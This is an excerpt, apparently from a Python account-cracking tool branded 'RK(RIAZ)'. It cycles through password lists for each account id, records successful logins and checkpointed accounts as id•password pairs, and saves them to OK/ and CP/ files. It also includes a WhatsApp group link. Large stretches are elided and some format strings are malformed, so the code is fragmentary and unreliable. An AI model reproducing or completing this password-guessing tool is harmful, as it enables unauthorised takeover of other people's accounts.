...
\x1b[96;1m/_______  /         \x1b[92;1m\____|__  /______  /\___  /   •RK(RIAZ)
        \x1b[96;1m\/                  \/       \/     \x1b[92;1m\/    
""")
def menu_log():
...
def kontakwa():
	...
	os.system('xdg-open https://chat.whatsapp.com/+923188214452')
	input('%s╚══[ %sKembali%s]%s'%(H,O,H,K))
	menu()
...
def ingfog():
	...
	mlaku("%s╠ %s[%s+%s] %sRIAZ Gans><"%(B,H,K,H,U))
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sRK%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%RK%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%RK%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sRK%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sRK%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sRK%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sRK%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
